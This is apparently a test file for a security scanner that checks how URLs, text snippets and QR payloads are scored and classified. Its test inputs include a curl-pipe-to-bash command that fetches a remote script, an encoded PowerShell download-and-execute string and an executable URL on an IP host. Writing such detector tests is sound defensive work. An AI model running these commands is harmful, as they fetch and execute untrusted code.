/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import test from 'node:test';
import assert from 'node:assert/strict';
import {
  analyzeUrl,
  analyzeSecurityText,
  analyzeQrPayload,
  scoreToSeverity,
  scoreToVerdict,
} from './scannerRules';

test('scoreToSeverity maps thresholds correctly', () => {
  assert.equal(scoreToSeverity(95), 'critical');
  assert.equal(scoreToSeverity(75), 'high');
  assert.equal(scoreToSeverity(50), 'medium');
  assert.equal(scoreToSeverity(20), 'low');
  assert.equal(scoreToSeverity(5), 'info');
});

test('analyzeUrl flags IP literal and dangerous extension', () => {
  const result = analyzeUrl('http://192.168.1.100/malicious_payload.exe');
  assert.ok(result.riskScore >= 70, `Expected high risk score, got ${result.riskScore}`);
  assert.equal(result.severity, 'high');
  assert.equal(result.verdict, 'malicious');

  const ruleIds = result.rulesTriggered.map((r) => r.ruleId);
  assert.ok(ruleIds.includes('URL-001'), 'Must flag IP literal host');
  assert.ok(ruleIds.includes('URL-004'), 'Must flag executable extension');
});

test('analyzeUrl rates benign domain as clean', () => {
  const result = analyzeUrl('https://example.com/docs/overview');
  assert.equal(result.riskScore, 0);
  assert.equal(result.severity, 'info');
  assert.equal(result.verdict, 'clean');
});

test('analyzeSecurityText flags AWS credentials and powershell execution', () => {
  const snippet = `
    const accessKey = "AKIAIOSFODNN7EXAMPLE";
    powershell.exe -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQp
  `;
  const result = analyzeSecurityText(snippet);
  assert.ok(result.riskScore >= 70);
  const ruleIds = result.rulesTriggered.map((r) => r.ruleId);
  assert.ok(ruleIds.includes('TXT-001'), 'Must identify AWS Access Key');
  assert.ok(ruleIds.includes('TXT-003'), 'Must identify encoded PowerShell command');
});

test('analyzeQrPayload classifies payload type before URL scan', () => {
  const wifiQr = 'WIFI:S:GuestAccess;T:WPA;P:Secret123;;';
  const wifiResult = analyzeQrPayload(wifiQr);
  assert.equal(wifiResult.qrDetails?.decodedType, 'wifi');
  assert.ok(wifiResult.indicators.some((i) => i.includes('WIFI')));

  const cmdQr = 'curl -s http://192.168.1.5/script.sh | bash';
  const cmdResult = analyzeQrPayload(cmdQr);
  assert.equal(cmdResult.qrDetails?.decodedType, 'command');
  assert.equal(cmdResult.severity, 'high');
});
